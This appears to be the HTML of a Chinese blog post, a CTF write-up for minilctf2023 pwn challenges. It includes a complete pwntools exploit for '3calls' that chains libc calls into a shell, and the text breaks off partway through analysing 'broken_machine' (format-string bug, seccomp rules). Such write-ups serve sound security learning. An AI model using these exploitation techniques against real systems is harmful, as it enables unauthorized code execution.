@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Static">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/03/10/ctfs-wp/minilctf2023 wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="我是菜🐕">
+<meta property="og:type" content="article">
+<meta property="og:title" content="minilctf2023 pwn wp &amp; 复现">
+<meta property="og:url" content="http://example.com/2024/03/10/CTFS-wp/minilctf2023%20wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="我是菜🐕">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-10T08:34:36.612Z">
+<meta property="article:modified_time" content="2024-03-10T08:34:32.123Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/cat-96.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            minilctf2023 pwn wp &amp; 复现 -
+        
+        Static&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Static&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/lighttheme.png","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/staticccccccc/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/cat-96.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Static&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/staticccccccc/">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/staticccccccc/">GITHUB</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">minilctf2023 pwn wp &amp; 复现</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/OIP-C.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Static</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-03-10 16:34:36</span>
+        <span class="mobile">2024-03-10 16:34:36</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-03-10 16:34:32</span>
+            <span class="mobile">2024-03-10 16:34:32</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTFS/">CTFS</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="3calls"><a href="#3calls" class="headerlink" title="3calls"></a>3calls</h2><p><code>checksec</code>看到保护全开，程序没有沙箱，也就没必要用描述中说的orw</p>
+<p>IDA打开看到程序直接给出了libc地址，会读取3次，然后check读入的数据，最后依次调用读入的3个函数。check函数会检查libc中是否由地址所对应的函数，也就是不能随意调用某一句，只能调用封装好的整个函数。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc = (__int64)(&amp;<span class="built_in">printf</span> - <span class="number">49390</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, &amp;<span class="built_in">printf</span> - <span class="number">49390</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  read(<span class="number">0</span>, &amp;F[i], <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;good job!&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">  F[j]();</span><br></pre></td></tr></table></figure></div>
+
+<p>这样一来，<code>system</code>函数必不可少。然后就是需要给其传参，显然不能直接传参。调试发现（调试时可以patch掉check函数，因为check函数会产生其他进程，让gdb无法attach到后续逻辑）程序执行<code>F[0]</code>时的rdi为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDI  0x7ffff7faea70 (_IO_stdfile_1_lock) ◂— 0x0</span><br></pre></td></tr></table></figure></div>
+
+<p>这个区域是一个可读写的区域，因此可以调用gets函数读取<code>/bin/sh</code>字符串，但是在调用gets的时候出现了一些玄学的问题（我没调试清楚），我第一次需要用一个gets直接读取换行符，第二个gets读取<code>/bin0sh</code>字符串（因为字符0的位置在下一个函数执行时会自动减一，也是没调试清楚），然后第三次就直接<code>system(&quot;/bin/sh&quot;)</code>了</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;x86_64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;localhost&#x27;,34643)</span></span><br><span class="line">io = process(<span class="string">&#x27;./3calls_2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(p64(libcbase+libc.symbols[<span class="string">&#x27;gets&#x27;</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(libcbase+libc.symbols[<span class="string">&#x27;gets&#x27;</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;good job!\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin0sh&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="broken-machine"><a href="#broken-machine" class="headerlink" title="broken_machine"></a>broken_machine</h2><p>Wings说这道题非预期了，预期解是在沙箱下硬搞，想想就害怕😰，这里写写我的非预期，非预期的地方是在进入沙箱之前就通过signal异常处理来退出，进入<code>_dl_fini</code>执行对应指针，然后<code>execve(&quot;/bin/sh\x00&quot;, 0, 0)</code></p>
+<p><code>checksec</code>看到只没开PIE，IDA打开看到</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Hi there! I&#x27;ve made a shellcode machine. Could you please input you code to test my machine? Thank you!&quot;</span>);</span><br><span class="line">signal(<span class="number">11</span>, handler);</span><br><span class="line">fgets(buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1023</span>; ++i )</span><br><span class="line">  v4 += buf[i] == <span class="number">110</span>;</span><br><span class="line"><span class="keyword">if</span> ( v4 &lt;= <span class="number">1</span> )</span><br><span class="line">  machine();</span><br></pre></td></tr></table></figure></div>
+
+<p><code>signal(11, handler);</code>信号处理函数会在程序执行产生<code>SIGSEGV</code>信号即异常时会进入handler函数进行退出。后面的for循环会检查读入了几个n，最多只能读入一个n</p>
+<p>然后看<code>machine()</code>函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">machine</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Prepare code...&quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, buf);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Setup sandbox...&quot;</span>);</span><br><span class="line">  mprotect(s, <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  sandbox();</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Finished!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> MEMORY[<span class="number">0x1000</span>]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>mmap会分配一片可读可写可执行的区域，地址为0x1000，但是要注意的是在一般在linux系统中mmap可分配的最低地址为0x10000<code>cat /proc/sys/vm/mmap_min_addr可以查看系统mmap可申请最低内存，一般为65536</code>（参考文章：<a class="link"   target="_blank" rel="noopener" href="http://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html" >mmap x86小于0x10000的虚地址 | Richard’s Blog (richardustc.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>），因此s的地址实际上是0x10000，所以最后的shellcode跳转实际上是非法内存访问，会直接跳转到信号处理函数</p>
+<p>sprintf这里是一个格式化字符串漏洞，后面沙箱会限制常用的一些系统调用，如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x14</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x12</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x00000013</span>  <span class="keyword">if</span> (A == readv) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x00000011</span>  <span class="keyword">if</span> (A == pread64) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000127</span>  <span class="keyword">if</span> (A == preadv) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) <span 